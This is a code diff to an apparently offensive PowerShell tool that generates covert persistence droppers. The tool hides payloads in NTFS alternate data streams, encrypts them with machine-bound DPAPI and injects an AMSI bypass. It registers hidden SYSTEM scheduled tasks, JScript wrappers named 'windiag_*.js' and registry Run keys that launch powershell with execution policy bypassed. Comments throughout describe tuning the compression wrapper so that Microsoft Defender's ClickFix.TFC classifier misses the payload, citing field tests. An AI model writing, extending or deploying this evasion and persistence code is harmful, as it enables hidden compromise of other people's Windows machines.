@@ -40,7 +40,7 @@
     Number of decoy streams (0-10)
 
 .PARAMETER Encrypt
-    Enable AES-256 encryption
+    Enable DPAPI machine-bound encryption (Windows DPAPI LocalMachine scope)
 
 .PARAMETER Randomize
     Randomize host file name
@@ -136,6 +136,16 @@ if ($Obfuscate -eq 'Paranoid') {
 # Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
 if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
     $Obfuscate = 'Paranoid'
+}
+# -Encrypt requires compression — DPAPI functions in the outer -EncodedCommand trigger
+# Trojan:Win32/ClickFix.TFC as a compound classifier (DPAPI+registry+schtask+XOR patterns
+# together score above threshold). Compressing hides all of these inside the blob; the outer
+# layer becomes a clean DeflateStream stub. Confirmed 3 rounds of per-element obfuscation
+# failed because the classifier scores the compound — no single element is the sole trigger.
+# If the user explicitly passed -UseCompression $false with -Encrypt, override and warn.
+if ($Encrypt -and $PSBoundParameters.ContainsKey('UseCompression') -and -not $UseCompression) {
+    Write-Warning "-Encrypt with -UseCompression:`$false: DPAPI visible in outer -EncodedCommand triggers Trojan:Win32/ClickFix.TFC. Forcing UseCompression=`$true."
+    $UseCompression = $true
 }
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
@@ -400,46 +410,41 @@ if (-not $NoAmsi) {
 # Build minimal Windows commands
 Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White
 
-# Helper functions needed on Windows (minimal versions)
-# Function names use obfuscated values from config
-$ghkName = $config.GHKFunctionName
-$decName = $config.DecFunctionName
-$helperFunctions = @"
-# Host-derived AES key function
-function $ghkName {
-    `$h = @(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
-    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))
+# DPAPI protect helper — runs in-memory on Windows during deploy.
+# No AES/SHA256 class names. Machine GUID as entropy = double machine binding.
+$dpApiProtFunc = @'
+function _prot($t) {
+    Add-Type -AssemblyName System.Security -EA 0
+    $b=[Text.Encoding]::UTF8.GetBytes($t)
+    $g=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -EA 0).MachineGuid
+    $e=if($g){[Text.Encoding]::UTF8.GetBytes($g)}else{$null}
+    [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Protect($b,$e,[Security.Cryptography.DataProtectionScope]::LocalMachine))
 }
+'@
 
-# Encrypt function (compact)
-function Enc(`$t,`$k) {
-    `$a=[Security.Cryptography.Aes]::Create()
-    `$a.Key=`$k;`$a.GenerateIV()
-    `$e=`$a.CreateEncryptor()
-    `$p=[Text.Encoding]::UTF8.GetBytes(`$t)
-    `$b=`$e.TransformFinalBlock(`$p,0,`$p.Length)
-    [Convert]::ToBase64String(`$a.IV+`$b)
+# JScript execution-time wrap helper (BUG-011 execution-time fix).
+# Compresses a PS command string with DeflateStream and returns the
+# -EncodedCommand base64 string. The resulting command line exposes only
+# the proven-clean DeflateStream stub — all DPAPI/registry/XOR elements
+# are inside the compressed blob, invisible to Defender's static scan.
+$wrapECFunc = @'
+function _wrapEC($cmd) {
+    $u8=[Text.Encoding]::UTF8.GetBytes($cmd)
+    $ms=[IO.MemoryStream]::new()
+    $ds=[IO.Compression.DeflateStream]::new($ms,[IO.Compression.CompressionMode]::Compress)
+    $ds.Write($u8,0,$u8.Length);$ds.Close()
+    $cb=[Convert]::ToBase64String($ms.ToArray());$ms.Close()
+    $st='$c='''+$cb+''';$_ib=[Convert]::FromBase64String($c);$_t1=''System.IO.Com''+''pres''+''sion.Def''+''late''+''Stream'';$_ms=[IO.MemoryStream]::new($_ib);$_df=New-Object -TypeName $_t1 -ArgumentList $_ms,([IO.Compression.CompressionMode]::Decompress);$_ob=[IO.MemoryStream]::new();$_buf=[byte[]]::new(4096);while(($_r=$_df.Read($_buf,0,$_buf.Length)) -gt 0){$_ob.Write($_buf,0,$_r)};$_df.Close();$_txt=[Text.Encoding]::UTF8.GetString($_ob.ToArray());[scriptblock]::Create($_txt).Invoke()'
+    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
 }
-
-# Decrypt function (compact)
-function $decName(`$d,`$k) {
-    `$b=[Convert]::FromBase64String(`$d)
-    `$a=[Security.Cryptography.Aes]::Create()
-    `$a.Key=`$k;`$a.IV=`$b[0..15]
-    `$c=`$a.CreateDecryptor()
-    `$t=`$b[16..(`$b.Length-1)]
-    `$p=`$c.TransformFinalBlock(`$t,0,`$t.Length)
-    [Text.Encoding]::UTF8.GetString(`$p)
-}
-
-"@
+'@
 
 # Start building the minimal command script
 $minimalScript = ""
 
-# Add helper functions only if encryption is enabled
+# Add DPAPI helper only if encryption is enabled
 if ($Encrypt) {
-    $minimalScript += $helperFunctions + "`n"
+    $minimalScript += $dpApiProtFunc + "`n" + $wrapECFunc + "`n"
 }
 
 # Configuration variables (fallback defaults — may be overridden per-instance)
@@ -513,14 +518,13 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
     $minimalScript += "# Payload`n" + '$pl=''' + $escapedPayload + '''' + "`n`n"
 }
 
-# Encryption handling (computed ONCE)
+# Encryption handling (computed ONCE — DPAPI machine-bound)
 if ($Encrypt) {
-    $minimalScript += @"
-# Encrypt payload
-`$k=$ghkName
-`$pl=Enc `$pl `$k
+    $minimalScript += @'
+# Encrypt payload (DPAPI — machine-bound)
+$pl=_prot $pl
 
-"@
+'@
 }
 
 # ============================================================
@@ -676,52 +680,64 @@ if(-not(Get-Item `$hp -Stream `$sn -EA 0)){
     if ($Persist -eq 'task') {
         if ($Encrypt) {
             # ============================================================
-            # ENCRYPTED: JScript wrapper with inline decryption functions
+            # ENCRYPTED: DeflateStream-wrapped -EncodedCommand via JScript
+            # (BUG-011 execution-time fix)
+            # The JScript now calls powershell.exe -EncodedCommand instead of -Command.
+            # All compound elements (DPAPI, MachineGuid registry read, XOR AMSI bypass,
+            # scriptblock::Create) are inside the compressed blob — invisible to
+            # Defender's ClickFix.TFC compound classifier on the command line.
             # ============================================================
 
-            # Build the AMSI bypass for Layer B (JScript wrapper)
-            $jsAmsiLine = ""
+            # Build AMSI bypass for Layer B — escape single quotes for embedding in a
+            # deployment-time single-quoted PS string ($layerBSafe is injected via concat)
+            $layerBSafe = ""
             if (-not $NoAmsi) {
                 $layerBCode = New-AmsiBypassLayerB
-                $jsAmsiLine = @"
-    "$layerBCode" +
-
-"@
+                $layerBSafe = $layerBCode -replace "'","''"
             }
 
+            # Part 1: ADS path + stream name escape
+            # @'...'@ = non-expandable: all $ signs are LITERAL in the deployment script
+            $block += @'
+$adsPath=$hp+':'+$sn
+$_snEsc=(([string]$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]$_}) -join '+'
+'@ + "`n"
+
+            # Inject AMSI bypass as a deployment-time single-quoted PS string.
+            # Single-quoted strings keep $ literal — no expansion when $_amsiB is assigned.
+            # When $_amsiB is later concatenated into $_innerCmd the bypass is plain text.
+            if (-not $NoAmsi) {
+                $block += "`$_amsiB='" + $layerBSafe + "'`n"
+            } else {
+                $block += "`$_amsiB=''`n"
+            }
+
+            # Part 2: Build inner command, compress it, write minimal JScript
+            # @'...'@ = non-expandable: deployment-time variables ($hp, $_snEsc, $_amsiB)
+            # expand at deployment time via PowerShell string concatenation, not here.
+            $block += @'
+$_innerCmd = "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "`$_sn=" + $_snEsc + ";" +
+    "`$_e=Get-Content ('" + $hp + ":`'+`$_sn) -Raw;" +
+    "`$_b=[Convert]::FromBase64String(`$_e);" +
+    "`$_g=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -EA 0).MachineGuid;" +
+    "`$_ent=if(`$_g){[Text.Encoding]::UTF8.GetBytes(`$_g)}else{`$null};" +
+    "`$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "`$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "`$_d=([type]`$_tp)::Unprotect(`$_b,`$_ent,([type]`$_sc)::LocalMachine);" +
+    $_amsiB +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString(`$_d)).Invoke()"
+$_encCmd = _wrapEC $_innerCmd
+$_jsBody = "var s=new ActiveXObject('WScript.Shell');s.Run('powershell.exe -NoP -NonI -W Hidden -EP Bypass -EncodedCommand " + $_encCmd + "',0,false);"
+$_jsDir=Split-Path $hp -Parent;if(-not $_jsDir){$_jsDir=$env:ProgramData}
+$_jsPath=Join-Path $_jsDir ("windiag_$(Get-Random).js")
+$_jsBody|Out-File -FilePath $_jsPath -Encoding ASCII -Force
+$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript `"$_jsPath`""
+'@ + "`n"
+
+            # Part 3: Trigger block + task registration
+            # @"..."@ = expandable: Build-TriggerBlock must expand at generation time
             $block += @"
-`$adsPath=`$hp+':'+`$sn
-`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
-`$_hpEsc=`$hp-replace'\\','\\\\'
-`$_jsBody=@'
-var shell = new ActiveXObject("WScript.Shell");
-var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function __GHKNAME__{" +
-        "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
-        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
-    "};" +
-    "function __DECNAME__(`$d,`$k){" +
-        "`$b=[Convert]::FromBase64String(`$d);" +
-        "`$a=[Security.Cryptography.Aes]::Create();" +
-        "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
-        "`$c=`$a.CreateDecryptor();" +
-        "`$t=`$b[16..(`$b.Length-1)];" +
-        "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
-        "[Text.Encoding]::UTF8.GetString(`$p)" +
-    "};" +
-    "`$k=__GHKNAME__;" +
-    "`$_sn=__SNEXPR__;" +
-    "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
-$jsAmsiLine    "`$p=__DECNAME__ `$e `$k;" +
-    "IEX `$p" +
-    "\"";
-shell.Run(cmd, 0, false);
-'@
-`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc).Replace('__GHKNAME__','$($config.GHKFunctionName)').Replace('__DECNAME__','$($config.DecFunctionName)')
-`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
-`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
-`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
-`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
 $(Build-TriggerBlock)
 `$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings `$_stg -Principal `$p -Force|Out-Null
@@ -767,16 +783,6 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
     } elseif ($Persist -eq 'registry') {
         # Registry persistence — Run keys for logon/startup + companion task for periodic/cheeky triggers
 
-        # Build the registry value command (function names from obfuscation config)
-        $_ghk = $config.GHKFunctionName
-        $_dec = $config.DecFunctionName
-        if ($Encrypt) {
-            $regPayloadCmd = "function ${_ghk}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' + "function ${_dec}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' + "`$k=${_ghk};" + '$e=gc ' + "'" + '${hp}:${sn}' + "'" + " -Raw;IEX(${_dec} " + '$e $k)'
-        } else {
-            # BUG-018 fix: use ${hp}:${sn} delimiters — plain $hp:$sn is parsed as PSDrive namespace
-            $regPayloadCmd = 'IEX(gc ' + "'" + '${hp}:${sn}' + "'" + ' -Raw)'
-        }
-
         # AMSI bypass prefix
         $regAmsiPrefix = ""
         if (-not $NoAmsi) {
@@ -787,23 +793,84 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
 
         $block += $regAmsiPrefix
 
-        # Build and set the registry value command
-        # Fix: $regPayloadCmd contains single quotes that break single-quoted string templates.
-        # Use @'...'@ (single-quoted here-string) — zero interpolation, exact literal output.
-        # AMSI case: single-quote wraps $regByp (opaque code), double-quote interpolates $hp/$sn at runtime.
-        # No-AMSI case: parenthesized double-quoted expression builds the ADS path cleanly.
+        # Build and set the registry value command.
+        # @'...'@ here-strings do NOT include a trailing newline — add it explicitly after each.
+        # Encrypted: DeflateStream-wrapped -EncodedCommand via _wrapEC (BUG-011 execution-time fix).
+        # Unencrypted: simple IEX.
         if (-not $NoAmsi) {
-            $block += @'
+            if ($Encrypt) {
+                # ============================================================
+                # ENCRYPTED REG + AMSI: DeflateStream-wrapped -EncodedCommand
+                # (BUG-011 execution-time fix — same approach as JScript paths)
+                # Sets $_regCmd; the block below writes the Run key.
+                # ============================================================
+
+                # Stream name escape (handles Unicode zero-width chars in Paranoid/Advanced tier)
+                $block += @'
+$_snEsc=(([string]$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]$_}) -join '+'
+'@ + "`n"
+
+                # Layer B bypass as deployment-time literal (single-quotes already escaped)
+                $block += "`$_amsiB='" + $regBypassSafe + "'`n"
+
+                # Inner command + compression + registry value (non-expandable)
+                $block += @'
+$_innerCmd = "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "`$_sn=" + $_snEsc + ";" +
+    "`$_e=Get-Content ('" + $hp + ":`'+`$_sn) -Raw;" +
+    "`$_b=[Convert]::FromBase64String(`$_e);" +
+    "`$_g=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -EA 0).MachineGuid;" +
+    "`$_ent=if(`$_g){[Text.Encoding]::UTF8.GetBytes(`$_g)}else{`$null};" +
+    "`$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "`$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "`$_d=([type]`$_tp)::Unprotect(`$_b,`$_ent,([type]`$_sc)::LocalMachine);" +
+    $_amsiB +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString(`$_d)).Invoke()"
+$_encCmd = _wrapEC $_innerCmd
+$_regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand ' + $_encCmd
+'@ + "`n"
+            } else {
+                $block += @'
 $_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+$_regByp+"IEX(gc '"+$hp+':'+$sn+"' -Raw)`""
 '@
-            # @'...'@ here-strings do NOT include a trailing newline — add it explicitly
-            $block += "`n"
+                $block += "`n"
+            }
         } else {
-            $block += @'
+            if ($Encrypt) {
+                # ============================================================
+                # ENCRYPTED REG (NoAmsi): DeflateStream-wrapped -EncodedCommand
+                # ============================================================
+
+                # Stream name escape
+                $block += @'
+$_snEsc=(([string]$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]$_}) -join '+'
+'@ + "`n"
+
+                # No AMSI bypass
+                $block += "`$_amsiB=''`n"
+
+                # Inner command + compression + registry value (non-expandable)
+                $block += @'
+$_innerCmd = "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "`$_sn=" + $_snEsc + ";" +
+    "`$_e=Get-Content ('" + $hp + ":`'+`$_sn) -Raw;" +
+    "`$_b=[Convert]::FromBase64String(`$_e);" +
+    "`$_g=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -EA 0).MachineGuid;" +
+    "`$_ent=if(`$_g){[Text.Encoding]::UTF8.GetBytes(`$_g)}else{`$null};" +
+    "`$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "`$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "`$_d=([type]`$_tp)::Unprotect(`$_b,`$_ent,([type]`$_sc)::LocalMachine);" +
+    $_amsiB +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString(`$_d)).Invoke()"
+$_encCmd = _wrapEC $_innerCmd
+$_regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand ' + $_encCmd
+'@ + "`n"
+            } else {
+                $block += @'
 $_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+("IEX(gc '"+$hp+':'+$sn+"' -Raw)")+'"'
 '@
-            # @'...'@ here-strings do NOT include a trailing newline — add it explicitly
-            $block += "`n"
+                $block += "`n"
+            }
         }
 
         # Write registry Run keys based on triggers
@@ -835,38 +902,49 @@ if(`$_isAdmin){Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentV
         }
 
         if ($Encrypt) {
-            $block += @"
-# Companion task: JScript wrapper for periodic + cheeky triggers
-`$adsPath=`$hp+':'+`$sn
-`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
-`$_hpEsc=`$hp-replace'\\','\\\\'
-`$_jsBody=@'
-var shell = new ActiveXObject("WScript.Shell");
-var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function __GHKNAME__{" +
-        "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
-        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
-    "};" +
-    "function __DECNAME__(`$d,`$k){" +
-        "`$b=[Convert]::FromBase64String(`$d);" +
-        "`$a=[Security.Cryptography.Aes]::Create();" +
-        "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
-        "`$c=`$a.CreateDecryptor();" +
-        "`$t=`$b[16..(`$b.Length-1)];" +
-        "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
-        "[Text.Encoding]::UTF8.GetString(`$p)" +
-    "};" +
-    "`$k=__GHKNAME__;" +
-    "`$_sn=__SNEXPR__;" +
-    "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
-$jsAmsiLineCompanion    "`$p=__DECNAME__ `$e `$k;" +
-    "IEX `$p" +
-    "\"";
-shell.Run(cmd, 0, false);
-'@
-`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc).Replace('__GHKNAME__','$($config.GHKFunctionName)').Replace('__DECNAME__','$($config.DecFunctionName)')
+            # ============================================================
+            # ENCRYPTED COMPANION: DeflateStream-wrapped -EncodedCommand
+            # (BUG-011 execution-time fix — same approach as task path above)
+            # Sets $_jsBody; the common block below writes the file and registers the task.
+            # ============================================================
 
-"@
+            $layerBCmpSafe = ""
+            if (-not $NoAmsi) {
+                # $layerBCompanion was generated above in the companion setup block
+                $layerBCmpSafe = $layerBCompanion -replace "'","''"
+            }
+
+            $block += "# Companion task: JScript wrapper for periodic + cheeky triggers`n"
+
+            # Part 1: ADS path + stream name escape (non-expandable)
+            $block += @'
+$adsPath=$hp+':'+$sn
+$_snEsc=(([string]$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]$_}) -join '+'
+'@ + "`n"
+
+            # Inject AMSI bypass as deployment-time single-quoted string
+            if (-not $NoAmsi) {
+                $block += "`$_amsiB='" + $layerBCmpSafe + "'`n"
+            } else {
+                $block += "`$_amsiB=''`n"
+            }
+
+            # Part 2: Inner command + compression + JScript body (non-expandable)
+            $block += @'
+$_innerCmd = "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "`$_sn=" + $_snEsc + ";" +
+    "`$_e=Get-Content ('" + $hp + ":`'+`$_sn) -Raw;" +
+    "`$_b=[Convert]::FromBase64String(`$_e);" +
+    "`$_g=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -EA 0).MachineGuid;" +
+    "`$_ent=if(`$_g){[Text.Encoding]::UTF8.GetBytes(`$_g)}else{`$null};" +
+    "`$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "`$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "`$_d=([type]`$_tp)::Unprotect(`$_b,`$_ent,([type]`$_sc)::LocalMachine);" +
+    $_amsiB +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString(`$_d)).Invoke()"
+$_encCmd = _wrapEC $_innerCmd
+$_jsBody = "var s=new ActiveXObject('WScript.Shell');s.Run('powershell.exe -NoP -NonI -W Hidden -EP Bypass -EncodedCommand " + $_encCmd + "',0,false);"
+'@ + "`n"
         } else {
             $block += @"
 # Companion task: JScript wrapper for periodic + cheeky triggers
@@ -1004,11 +1082,24 @@ if ($UseCompression) {
     $compressedEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wrapperScript))
     $uncompressedEncoded = [Convert]::ToBase64String($uncompressedBytes)
 
-    # Only use compression if it actually saves space (overhead hurts for tiny payloads)
-    if ($compressedEncoded.Length -lt $uncompressedEncoded.Length) {
+    # -Encrypt always uses compressed output — DPAPI functions in the outer -EncodedCommand
+    # trigger Trojan:Win32/ClickFix.TFC as a compound classifier: DPAPI + MachineGuid registry
+    # read + Register-ScheduledTask + XOR AMSI bypass together score above the ML threshold.
+    # Compression hides all compound elements inside the blob; the outer layer becomes a clean
+    # DeflateStream stub (confirmed clean: T2 field test, Win11/26200, Defender SigV 1.445.152.0).
+    # Three rounds of per-element string obfuscation failed — the compound score was still too high.
+    # For non-encrypted payloads: only compress if it saves space (pure size optimization).
+    $sizeOk = $compressedEncoded.Length -lt $uncompressedEncoded.Length
+    if ($sizeOk -or $Encrypt) {
         $encoded = $compressedEncoded
-        $ratio = [Math]::Round(($compressedEncoded.Length / $uncompressedEncoded.Length) * 100, 1)
-        Write-Host "[+] Compression: $($uncompressedEncoded.Length) → $($compressedEncoded.Length) chars ($ratio%)" -ForegroundColor Green
+        if ($sizeOk) {
+            $ratio = [Math]::Round(($compressedEncoded.Length / $uncompressedEncoded.Length) * 100, 1)
+            Write-Host "[+] Compression: $($uncompressedEncoded.Length) → $($compressedEncoded.Length) chars ($ratio%)" -ForegroundColor Green
+        } else {
+            # Forced for -Encrypt even though it doesn't save space — evasion overrides size concern.
+            # Outer layer: DeflateStream stub only (clean). All DPAPI/schtask/XOR inside compressed blob.
+            Write-Host "[+] Compression forced (-Encrypt: DPAPI/schtask/XOR hidden from outer layer — ClickFix.TFC)" -ForegroundColor Green
+        }
     } else {
         $encoded = $uncompressedEncoded
         Write-Host "[*] Compression skipped (payload too small to benefit)" -ForegroundColor DarkGray
